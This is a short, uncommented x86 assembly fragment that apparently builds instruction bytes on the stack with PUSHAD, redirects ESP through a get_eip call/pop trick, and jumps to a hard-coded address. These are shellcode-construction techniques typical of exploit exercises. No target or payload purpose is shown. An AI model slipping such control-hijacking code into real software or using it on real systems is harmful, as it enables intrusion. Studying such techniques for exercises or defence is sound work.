mov esp, 0x3c8

mov ebx, 0x01606060
mov edx, 0x664949cc
mov ecx, 0x0080fc81
mov eax, 0xbc66f277
pushad
mov dword ptr[esp+0x20],0xeceb0390

call get_eip
get_eip:
pop esp
mov ecx, 0xFFFFFFe9

mov eax, 0x3b8
jmp eax